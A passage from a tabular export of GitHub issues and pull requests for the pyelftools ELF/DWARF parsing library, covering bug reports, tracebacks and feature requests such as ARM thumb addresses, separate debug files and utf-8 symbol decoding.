    |DW_AT_name        :  AttributeValue(name='DW_AT_name', form='DW_FORM_strp', value=b'main', raw_value=5, offset=38)
    |DW_AT_decl_file   :  AttributeValue(name='DW_AT_decl_file', form='DW_FORM_data1', value=1, raw_value=1, offset=42)
    |DW_AT_decl_line   :  AttributeValue(name='DW_AT_decl_line', form='DW_FORM_data1', value=1, raw_value=1, offset=43)
    |DW_AT_decl_column :  AttributeValue(name='DW_AT_decl_column', form='DW_FORM_data1', value=5, raw_value=5, offset=44)
    |DW_AT_prototyped  :  AttributeValue(name='DW_AT_prototyped', form='DW_FORM_flag_present', value=b'', raw_value=b'', offset=45)
    |DW_AT_type        :  AttributeValue(name='DW_AT_type', form='DW_FORM_ref4', value=94, raw_value=94, offset=45)
    |DW_AT_low_pc      :  AttributeValue(name='DW_AT_low_pc', form='DW_FORM_addr', value=32768, raw_value=32768, offset=49)
    |DW_AT_high_pc     :  AttributeValue(name='DW_AT_high_pc', form='DW_FORM_data4', value=24, raw_value=24, offset=53)
    |DW_AT_frame_base  :  AttributeValue(name='DW_AT_frame_base', form='DW_FORM_exprloc', value=[156], raw_value=[156], offset=57)
    |DW_AT_GNU_all_call_sites:  AttributeValue(name='DW_AT_GNU_all_call_sites', form='DW_FORM_flag_present', value=b'', raw_value=b'', offset=59)
    |DW_AT_sibling     :  AttributeValue(name='DW_AT_sibling', form='DW_FORM_ref4', value=94, raw_value=94, offset=59)
...
main 32769
```
As you can see, there is a difference in the address assigned to symbol `main` in elf (`32769`) and dwarf (`32768`) forms. The least significant bit is used to indicate which mode a function uses: thumb or arm.
Does the library support these cases or maybe have some auxiliary functions that could make the consistency between dwarf and elf representations?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/197/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/197/comments,https://api.github.com/repos/eliben/pyelftools/issues/197/events,https://github.com/eliben/pyelftools/issues/197,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/196,357265408,MDExOlB1bGxSZXF1ZXN0MjEzMzIxOTg2,196,Fixup for arm call relocation,22766161,closed,FALSE,NA,NA,1,2018-09-05T14:47:50Z,2018-09-05T22:03:23Z,2018-09-05T22:00:35Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/196/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/196/comments,https://api.github.com/repos/eliben/pyelftools/issues/196/events,https://github.com/eliben/pyelftools/pull/196,https://api.github.com/repos/eliben/pyelftools/pulls/196
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/195,354620610,MDU6SXNzdWUzNTQ2MjA2MTA=,195,Can pyelftools load elf file without section headers?,7570502,open,FALSE,NA,NA,1,2018-08-28T08:17:55Z,2018-08-29T22:13:24Z,NA,NONE,NA,"I got mips elf file without section headers, when I use pyelftools to load this file, I got error
Can pyelftools load elf file without section headers?
If so, what should I do next?
Here I got two busybox files, one have section headers while another one don't
1) successed busybox -->readelf -h s_busybox  
![1](https://user-images.githubusercontent.com/7570502/44709839-2fb9cc00-aadd-11e8-9f28-59a76b6b9625.png)

2) failed busybox --> readelf -h f_busybox
![2](https://user-images.githubusercontent.com/7570502/44709851-36484380-aadd-11e8-8cd2-4f2582931692.png)

[busybox.zip](https://github.com/eliben/pyelftools/files/2327125/busybox.zip)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/195/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/195/comments,https://api.github.com/repos/eliben/pyelftools/issues/195/events,https://github.com/eliben/pyelftools/issues/195,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/194,351635439,MDExOlB1bGxSZXF1ZXN0MjA5MTgwMDYz,194,Call relocation for ARM V3,22766161,closed,FALSE,NA,NA,5,2018-08-17T15:18:42Z,2018-09-05T14:47:36Z,2018-09-05T12:25:29Z,CONTRIBUTOR,NA,"Call instruction relocating for ARM requires a specific calculation function.
This patch implements it.
I tested this on ARMv5 architecture.

Signed-off-by: Koltunov Dmitry <koltunov@ispras.ru>",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/194/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/194/comments,https://api.github.com/repos/eliben/pyelftools/issues/194/events,https://github.com/eliben/pyelftools/pull/194,https://api.github.com/repos/eliben/pyelftools/pulls/194
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/193,348855814,MDU6SXNzdWUzNDg4NTU4MTQ=,193,Support for parsing .debug_types section to support DWARFv4,26985871,open,FALSE,NA,NA,2,2018-08-08T19:13:31Z,2018-10-15T21:20:56Z,NA,NONE,NA,"Compilers with DWARFv4 support (eg:- IAR embedded workbench) tend to put enums and typedefs present in header files into the .debug_types section. I would be good to have support to parse this section as well. 

",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/193/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/193/comments,https://api.github.com/repos/eliben/pyelftools/issues/193/events,https://github.com/eliben/pyelftools/issues/193,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/192,343138880,MDExOlB1bGxSZXF1ZXN0MjAyODczNTg1,192,readelf: support --wide option,8960884,closed,FALSE,NA,NA,4,2018-07-20T14:54:45Z,2020-02-04T14:31:24Z,2020-02-04T14:31:24Z,CONTRIBUTOR,NA,"I had some issues for readelf with testfiles filename > 76 chars

What do you think?",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/192/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/192/comments,https://api.github.com/repos/eliben/pyelftools/issues/192/events,https://github.com/eliben/pyelftools/pull/192,https://api.github.com/repos/eliben/pyelftools/pulls/192
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/191,332650935,MDU6SXNzdWUzMzI2NTA5MzU=,191,Add API for high-level access to version info,1101391,open,FALSE,NA,NA,3,2018-06-15T05:31:17Z,2018-06-15T13:46:56Z,NA,NONE,NA,Getting access to symbol version is very important in some applications but the only way to do it now seems to be copy-paste big chunks of code from `readelf.py`. Can this be fixed by factoring them out to dedicated APIs?,NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/191/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/191/comments,https://api.github.com/repos/eliben/pyelftools/issues/191/events,https://github.com/eliben/pyelftools/issues/191,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/190,326761074,MDExOlB1bGxSZXF1ZXN0MTkwNzU1NDgz,190,Issue/128 povgen,2332715,closed,FALSE,NA,NA,1,2018-05-26T19:12:28Z,2018-05-31T20:35:19Z,2018-05-26T19:12:39Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/190/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/190/comments,https://api.github.com/repos/eliben/pyelftools/issues/190/events,https://github.com/eliben/pyelftools/pull/190,https://api.github.com/repos/eliben/pyelftools/pulls/190
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/189,320967107,MDU6SXNzdWUzMjA5NjcxMDc=,189,Expand DT_FLAGS or provide flags enum,1101391,closed,FALSE,NA,NA,0,2018-05-07T21:37:58Z,2018-10-04T12:15:50Z,2018-10-04T12:15:50Z,NONE,NA,"`DT_FLAGS` dynamic tag is a bitmask which may contain any combination of `DF_ORIGIN`, `DF_SYMBOLIC`, etc. flags. Would be nice if pyelftools expanded `DT_FLAGS` to a set of flags or at least provided enum with values of flags.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/189/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/189/comments,https://api.github.com/repos/eliben/pyelftools/issues/189/events,https://github.com/eliben/pyelftools/issues/189,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/188,314194729,MDU6SXNzdWUzMTQxOTQ3Mjk=,188,Python 3: Some lables are bytes others are str.,424358,open,FALSE,NA,NA,8,2018-04-13T17:44:58Z,2020-02-15T00:15:24Z,NA,NONE,NA,"With Python 3, some times labels are type(str) other times they are type(bytes).
For instance with a DT_NEEDED tagged item it might be a bytes, other times it's might be a str.

Since they are labels they should be always a str never bytes.
As it is, one must check and convert each label before they do any kind of string operation on the label et al. ",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/188/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/188/comments,https://api.github.com/repos/eliben/pyelftools/issues/188/events,https://github.com/eliben/pyelftools/issues/188,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/187,306788162,MDU6SXNzdWUzMDY3ODgxNjI=,187,re-add support for initializing sections with an explicit stream,2498805,closed,FALSE,NA,NA,5,2018-03-20T09:33:15Z,2018-03-21T23:57:36Z,2018-03-21T23:57:36Z,CONTRIBUTOR,NA,"somewhere between 0.24 and now, the Section constructors had their stream argument removed, and the stream is now grabbed from the reader. I would like the ability to pass in an explicit stream to use besides the one in the reader.

The rationale for this is that when trying to analyze binaries robustly, section data is not actually considered by loaders and is thus a potential wedge for malicious actors to confuse analysis tools by providing misleading data. Instead, we want to use just the program headers (segments) for loading. This means getting the string tables/relocations/etc out of the PT_DYNAMIC segment instead of the section table. However, entries in PT_DYNAMIC provide their addresses in terms of _how they look when actually mapped into an address space_. In our application, we're already constructing the loaded binary into an address space object which supports the python stream interface, so instead of trying to translate the address back into an offset into the binary by checking each of the PT_LOADs again, we used to be able to just provide our copy of the address space directly to a RelocationSection object to be able to read out the relocations, for example.

If you think this is an ok change, I can do it pretty easily.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/187/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/187/comments,https://api.github.com/repos/eliben/pyelftools/issues/187/events,https://github.com/eliben/pyelftools/issues/187,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/186,305782362,MDU6SXNzdWUzMDU3ODIzNjI=,186,Support for separate dwarf files?,1156776,open,FALSE,NA,NA,3,2018-03-16T02:31:28Z,2020-05-10T13:36:26Z,NA,NONE,NA,"I'm trying to find symbols in the linux loader (`ld-2.24.so`) using its dwarf info, because on ubuntu the loader is stripped. But the dwarf info for the loader is in a separate file:

Loader elf file: 

    /lib/x86_64-linux-gnu/ld-2.24.so

Loader dwarf file (found via gdb):
 
    /usr/lib/debug/.build-id/6f/150f33b150d6a81e26a425dd47d713d00f2d29.debug

When I try to access the dwarf info in `ld-2.24.so`, pyelftools tells me there is no debug info there. But when I try to access the dwarf file directly, pyelftools crashes because the offsets refer to the elf file, not to the dwarf file that is being read:

        > python examples/examine_dwarf_info.py --test /usr/lib/debug/.build-id/6f/150f33b150d6a81e26a425dd47d713d00f2d29.debug
        Processing file: /usr/lib/debug/.build-id/6f/150f33b150d6a81e26a425dd47d713d00f2d29.debug
          Found a compile unit at offset 0, length 36768
            Top DIE with tag=DW_TAG_compile_unit
            name=/build/glibc-p3Km7c/glibc-2.24/elf/rtld.c
          Found a compile unit at offset 36772, length 31677
            Top DIE with tag=DW_TAG_compile_unit
            name=/build/glibc-p3Km7c/glibc-2.24/elf/dl-load.c
          Found a compile unit at offset 68453, length 21926
            Top DIE with tag=DW_TAG_compile_unit
            name=/build/glibc-p3Km7c/glibc-2.24/elf/dl-lookup.c
          Found a compile unit at offset 90383, length 15463
            Top DIE with tag=DW_TAG_compile_unit
            name=/build/glibc-p3Km7c/glibc-2.24/elf/dl-object.c
          Found a compile unit at offset 105850, length 20361
            Top DIE with tag=DW_TAG_compile_unit
            name=/build/glibc-p3Km7c/glibc-2.24/elf/dl-reloc.c
          Found a compile unit at offset 126215, length 19006
        Traceback (most recent call last):
          File ""examples/examine_dwarf_info.py"", line 57, in <module>
            process_file(filename)
          File ""examples/examine_dwarf_info.py"", line 48, in process_file
            top_DIE = CU.get_top_DIE()
          File ""./elftools/dwarf/compileunit.py"", line 76, in get_top_DIE
            return self._get_DIE(0)
          File ""./elftools/dwarf/compileunit.py"", line 95, in _get_DIE
            self._parse_DIEs()
          File ""./elftools/dwarf/compileunit.py"", line 119, in _parse_DIEs
            offset=die_offset)
          File ""./elftools/dwarf/die.py"", line 92, in __init__
            self._parse_DIE()
          File ""./elftools/dwarf/die.py"", line 174, in _parse_DIE
            abbrev_decl = self.cu.get_abbrev_table().get_abbrev(
          File ""./elftools/dwarf/compileunit.py"", line 69, in get_abbrev_table
            self['debug_abbrev_offset'])
          File ""./elftools/dwarf/dwarfinfo.py"", line 129, in get_abbrev_table
            ""Offset '0x%x' to abbrev table out of section bounds"" % offset)
          File ""./elftools/common/utils.py"", line 83, in dwarf_assert
            _assert_with_exception(cond, msg, DWARFError)
          File ""./elftools/common/utils.py"", line 109, in _assert_with_exception
            raise exception_type(msg)
        elftools.common.exceptions.DWARFError: Offset '0x1ecd' to abbrev table out of section bounds

So how can I use pyelftools to correlate an elf file with a separate dwarf file?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/186/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/186/comments,https://api.github.com/repos/eliben/pyelftools/issues/186/events,https://github.com/eliben/pyelftools/issues/186,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/185,303918534,MDU6SXNzdWUzMDM5MTg1MzQ=,185,Release 1.6.0 unbundle_nbi subprocess.Popen environment missing,940228,closed,FALSE,NA,NA,1,2018-03-09T17:27:38Z,2018-03-09T17:28:30Z,2018-03-09T17:28:30Z,CONTRIBUTOR,NA,"Insufficient testing.  Apparently the user environment is not being passed to subprocess.Popen (copied from `bintools/unbundleNX9K.py`) which makes the shebang in disNBI fail to find perl:

```
INFO:imgunbundler.unbundlers.unbundle_nbi:Extracting files from /data/magregor-specialtest/nxos.7.0.3.IHD8.0.397.bin to /data/output/magregor ...
ERROR:imgunbundler.unbundlers.unbundle_nbi:DISNBI return code 127:
/usr/bin/env: ‘perl -w’: No such file or directory


Traceback (most recent call last):
  File ""/home/magregor/src/imgunbundle/imgunbundler/unbundlers/unbundle_nbi.py"", line 86, in unbundle
    raise ImgunbundleInternalError(errmsg)
ImgunbundleInternalError: DISNBI return code 127:
/usr/bin/env: ‘perl -w’: No such file or directory


ERROR:imgunbundler.unbundlers.unbundle_generic:Problem with <imgunbundler.unbundlers.unbundle_nbi.unbundle_nbi object at 0x7fe66b478610>
Traceback (most recent call last):
  File ""/home/magregor/src/imgunbundle/imgunbundler/unbundlers/unbundle_generic.py"", line 210, in unbundle_worker
    result = unbundler_instance.unbundle(fileobj)
  File ""/home/magregor/src/imgunbundle/imgunbundler/unbundlers/unbundle_nbi.py"", line 92, in unbundle
    raise ImgunbundleInternalError(e.message)
ImgunbundleInternalError: DISNBI return code 127:
/usr/bin/env: ‘perl -w’: No such file or directory


DISNBI return code 127:
/usr/bin/env: ‘perl -w’: No such file or directory


Traceback (most recent call last):
  File ""/home/magregor/.virtualenvs/imgunbundler/bin/imgunbundle"", line 11, in <module>
    load_entry_point('imgunbundler', 'console_scripts', 'imgunbundle')()
  File ""/home/magregor/src/imgunbundle/imgunbundler/imgunbundle.py"", line 290, in main
    run(imgfile, outdir)
  File ""/home/magregor/src/imgunbundle/imgunbundler/imgunbundle.py"", line 90, in run
    first_unbundler.unbundle_generic(fileobj, 0, **kwargs)
  File ""/home/magregor/src/imgunbundle/imgunbundler/unbundlers/unbundle_generic.py"", line 327, in unbundle_generic
    is_bundle = self.unbundle_worker(fileobj, **kwargs)
  File ""/home/magregor/src/imgunbundle/imgunbundler/unbundlers/unbundle_generic.py"", line 218, in unbundle_worker
    raise errorcodes.ImgunbundleInternalError(str(e))
imgunbundler.errorcodes.ImgunbundleInternalError: DISNBI return code 127:
/usr/bin/env: ‘perl -w’: No such file or directory
```",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/185/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/185/comments,https://api.github.com/repos/eliben/pyelftools/issues/185/events,https://github.com/eliben/pyelftools/issues/185,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/184,302205281,MDExOlB1bGxSZXF1ZXN0MTcyNzk4NDQ0,184,Fix DW_CFA_remember_state,506932,closed,FALSE,NA,NA,2,2018-03-05T08:11:32Z,2018-03-06T13:17:22Z,2018-03-06T13:16:42Z,CONTRIBUTOR,NA,"Supersedes #174 (adds a test case)

Fixes #103

Also fixes description for DW_CFA_def_cfa_expression (`readelf` is missing a colon here).",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/184/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/184/comments,https://api.github.com/repos/eliben/pyelftools/issues/184/events,https://github.com/eliben/pyelftools/pull/184,https://api.github.com/repos/eliben/pyelftools/pulls/184
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/183,299214515,MDExOlB1bGxSZXF1ZXN0MTcwNjUxODUz,183,Choose members of the dynamic tag enum based on the current machine,2498805,closed,FALSE,NA,NA,2,2018-02-22T04:01:36Z,2018-02-23T13:30:53Z,2018-02-23T13:30:53Z,CONTRIBUTOR,NA,"closes #175 

Adds a testcase and a 35k android marshmallow library (libsoundtrigger.so) for the testcase. The testcase also reuses an existing solaris test binary.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/183/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/183/comments,https://api.github.com/repos/eliben/pyelftools/issues/183/events,https://github.com/eliben/pyelftools/pull/183,https://api.github.com/repos/eliben/pyelftools/pulls/183
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/182,299214384,MDExOlB1bGxSZXF1ZXN0MTcwNjUxNzY4,182,Convert all ascii decoding to utf-8 decoding,2498805,closed,FALSE,NA,NA,2,2018-02-22T04:00:38Z,2018-02-23T13:28:52Z,2018-02-23T13:28:51Z,CONTRIBUTOR,NA,"Closes #173 

Adds a testcase asserting that we can handle a symbol named Δ",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/182/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/182/comments,https://api.github.com/repos/eliben/pyelftools/issues/182/events,https://github.com/eliben/pyelftools/pull/182,https://api.github.com/repos/eliben/pyelftools/pulls/182
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/181,297590130,MDU6SXNzdWUyOTc1OTAxMzA=,181,Q: EM_BLAFKIN vs EM_BLACKFIN,214034,closed,FALSE,NA,NA,3,2018-02-15T20:44:09Z,2018-02-17T13:12:21Z,2018-02-16T13:59:23Z,NONE,NA,"

according to the [linux kernel sources](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/elf-em.h) and also to [elftools/elf/enums.py](https://github.com/eliben/pyelftools/blob/master/elftools/elf/enums.py) `EM_BLACKFIN` seems to be the correct spelling, but `ELFFile.header.e_machine` uses `EM_BLAFKIN` instead.

is this a typo? or intentional?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/181/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/181/comments,https://api.github.com/repos/eliben/pyelftools/issues/181/events,https://github.com/eliben/pyelftools/issues/181,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/180,296945447,MDU6SXNzdWUyOTY5NDU0NDc=,180,"from Construct developer, a note",5385838,closed,FALSE,NA,NA,4,2018-02-14T01:24:10Z,2018-02-17T14:37:53Z,2018-02-17T14:35:17Z,NONE,NA,"I am the developer of Construct (a parsing library) since I took over the project 2 years ago. Please refer any other projects that also use this library to this post, or copy it over to them. 

Construct is undergoing heavy changes at the moment, similar to those between 2.5->2.8, including addition of compiler feature (to make it much faster than Kaitai), but also several classes are going to be removed (for a good reason), and also few were added. API will be unstable for about a month.

What you can do:
- All scheduled work is posted as tickets, in [Issues](https://github.com/construct/construct/issues) and also on [Kanban](https://github.com/construct/construct/projects/3) page. If you subscribe (watch repository) then you will have advance notice of any incoming changes. Unfortunately those tickets also include minor work items, so you would get some clutter notifications too. I appologise for that.
- I encourage everyone to browse those tickets, vote for feature requests, but also post objections for planned removal of features, or changes in semantics. Subscribing therefore is recommended.
- You can find what was already changed (at any moment) on [Transition page](https://construct.readthedocs.io/en/latest/transition29.html), which is like a growing changelog. It gets updated whenever something gets added or removed, but since the order is not chronological, new items do not end up on top or bottom of the list.
- You can find currently available classes and semantics on revamped [Core API pages](https://construct.readthedocs.io/en/latest/index.html#api-reference). Those pages are very extensive and always uptodate with the implementation.
- **Feel free, at any point in time, to open a new Issue and ask questions or make complaints** about breakage. At minimum, I can offer advice and possible alternatives. People very often use the classes in ways that were not designed for, like use String classes to process Bytes.
- **Feel free, at any point in time, to open a new Issue and request changes.** If you need a new class, and make a good clear case, I would be more than willing to add it to core library to support your project.
- API should be stable within a month, so either do version pinning and deal with it then, or keep fixing your code at every release (which is ~3 day cycle at the moment).

Close this topic at your discretion.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/180/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/180/comments,https://api.github.com/repos/eliben/pyelftools/issues/180/events,https://github.com/eliben/pyelftools/issues/180,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/179,294051009,MDU6SXNzdWUyOTQwNTEwMDk=,179,Traversing typedef struct issue,10421223,closed,FALSE,NA,NA,3,2018-02-02T23:08:10Z,2018-02-13T18:42:53Z,2018-02-13T18:42:53Z,NONE,NA,"This is **potentially** not a bug, but rather a gap in documentation, or even more likely, a lack of knowledge on my part.

I have a struct definition similar to this:

```
typedef struct node{
  uint32_t id;
  struct node *next;
} Node_t;
```

I'm able to use traverse the CUs until I find the first reference to the a variable of type ```Node_t```;  which I then start examining and deconstruct. My issue is that once I find the ```*next``` element in the struct definition, I am not able to link it back to the main ```Node_t``` definition, I can only see the parent which is reported to have type ```node```.

I am using pyelftools to walk the elf file produced by the compiler to generate RPC code callable from the a different host.

Clues, suggestions?

Thanks in advance!",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/179/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/179/comments,https://api.github.com/repos/eliben/pyelftools/issues/179/events,https://github.com/eliben/pyelftools/issues/179,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/178,290111340,MDU6SXNzdWUyOTAxMTEzNDA=,178,Error running readelf.py with Python 3.6.4,2977080,closed,FALSE,NA,NA,2,2018-01-19T21:24:12Z,2018-01-19T21:56:22Z,2018-01-19T21:56:22Z,NONE,NA,"Getting ImportError on 'iterbytes' on:

from elftools.common.py3compat import (ifilter, byte2int, bytes2str, itervalues, str2bytes, iterbytes)

This is a fresh install of Python 3.x and the only thing I've pip installed is the pyelftools. ",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/178/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/178/comments,https://api.github.com/repos/eliben/pyelftools/issues/178/events,https://github.com/eliben/pyelftools/issues/178,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/177,289980439,MDExOlB1bGxSZXF1ZXN0MTYzOTczMDgz,177,Do not crash if CIE doesn't define CFA,506932,closed,FALSE,NA,NA,4,2018-01-19T13:46:01Z,2018-01-20T17:18:41Z,2018-01-20T17:18:10Z,CONTRIBUTOR,NA,"```
Contents of the .eh_frame section:

00000000 0000000000000010 00000000 CIE ""zR"" cf=1 df=-8 ra=16
   LOC           CFA      
0000000000000000Traceback (most recent call last):
  File ""scripts/readelf.py"", line 1377, in <module>
    main()
  File ""scripts/readelf.py"", line 1356, in main
    readelf.display_debug_dump(options.debug_dump_what)
  File ""scripts/readelf.py"", line 737, in display_debug_dump
    self._dump_debug_frames_interp()
  File ""scripts/readelf.py"", line 1222, in _dump_debug_frames_interp
    self._dwarfinfo.EH_CFI_entries())
  File ""scripts/readelf.py"", line 1204, in _dump_frames_interp_info
    self._emit(' %-9s' % describe_CFI_CFA_rule(line['cfa']))
  File ""./elftools/dwarf/descriptions.py"", line 129, in describe_CFI_CFA_rule
    if rule.expr:
AttributeError: 'NoneType' object has no attribute 'expr'
```",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/177/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/177/comments,https://api.github.com/repos/eliben/pyelftools/issues/177/events,https://github.com/eliben/pyelftools/pull/177,https://api.github.com/repos/eliben/pyelftools/pulls/177
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/176,286229377,MDExOlB1bGxSZXF1ZXN0MTYxMjk2NzYw,176,Don't include 'meta-tag' markers in descriptions of ENUM_D_TAG,2498805,closed,FALSE,NA,NA,4,2018-01-05T09:02:38Z,2018-01-05T21:55:11Z,2018-01-05T21:55:00Z,CONTRIBUTOR,NA,fixes #150 ,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/176/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/176/comments,https://api.github.com/repos/eliben/pyelftools/issues/176/events,https://github.com/eliben/pyelftools/pull/176,https://api.github.com/repos/eliben/pyelftools/pulls/176
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/175,286216541,MDU6SXNzdWUyODYyMTY1NDE=,175,Only use os- and processor- specific enum values on the appropriate os and processor,2498805,closed,FALSE,NA,NA,5,2018-01-05T07:54:41Z,2018-02-23T13:30:53Z,2018-02-23T13:30:53Z,CONTRIBUTOR,NA,"So this is the _actual_ cause that was behind yesterday's issue, though that is probably still a problem.

If you look at how this project tries to load the file linked from this issue https://github.com/angr/cle/issues/103#issuecomment-355405436 it crashes because it thinks the dynamic tag 0x6000000f is `DT_SUNW_FILTER`, and assumes that the corresponding d_val points to a string. However, this is not solaris, and 0x6000000f is not a filter here, so the pointer is not an index into a string table, and so the lookup crashes.

This seems like a very complicated and invasive change, and I don't know anything about the architecture of this project, so I'd appreciate a response other than ""patches welcome"".",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/175/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/175/comments,https://api.github.com/repos/eliben/pyelftools/issues/175/events,https://github.com/eliben/pyelftools/issues/175,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/174,285980624,MDExOlB1bGxSZXF1ZXN0MTYxMTIwMDI2,174,Fix #103,6832600,closed,FALSE,NA,NA,6,2018-01-04T13:08:42Z,2018-03-06T13:17:05Z,2018-03-06T13:17:05Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/174/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/174/comments,https://api.github.com/repos/eliben/pyelftools/issues/174/events,https://github.com/eliben/pyelftools/pull/174,https://api.github.com/repos/eliben/pyelftools/pulls/174
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/173,285862574,MDU6SXNzdWUyODU4NjI1NzQ=,173,Crash when non-ascii characters are used in symbols or sonames,2498805,closed,FALSE,NA,NA,2,2018-01-04T02:07:07Z,2018-02-23T13:28:51Z,2018-02-23T13:28:51Z,CONTRIBUTOR,NA,"At the bottom of every read from memory is the conversion from bytes to string with `.decode('ascii')`. This fails extremely loudly when there's a character >0x7e. Strings like this can occur naturally in e.g. elf files found on android systems. To reproduce just copy libc.so.6 and replace the libc.so.6 soname text with libc\xffso.6 or whatever.

Two possible solutions:
- return bytes instead of string
- replace `s.decode('ascii')` with `''.join(chr(c) for c in s)`",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/173/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/173/comments,https://api.github.com/repos/eliben/pyelftools/issues/173/events,https://github.com/eliben/pyelftools/issues/173,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/172,276846956,MDExOlB1bGxSZXF1ZXN0MTU0NjkxNjU4,172,Arm exidx,8016228,closed,FALSE,NA,NA,1,2017-11-26T18:53:36Z,2017-11-26T21:41:05Z,2017-11-26T21:41:05Z,CONTRIBUTOR,NA,This addressess issue #171 ,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/172/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/172/comments,https://api.github.com/repos/eliben/pyelftools/issues/172/events,https://github.com/eliben/pyelftools/pull/172,https://api.github.com/repos/eliben/pyelftools/pulls/172
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/171,276846932,MDU6SXNzdWUyNzY4NDY5MzI=,171,EXIDX vs ARM_EXIDX (difference between binutils and pyelftools readelf -e),8016228,closed,FALSE,NA,NA,1,2017-11-26T18:53:14Z,2017-11-27T12:43:27Z,2017-11-27T12:43:27Z,CONTRIBUTOR,NA,"for ARM binaries, readelf reports the ARM_EXIDX program header as EXIDX

diff:

```
 Program Headers:
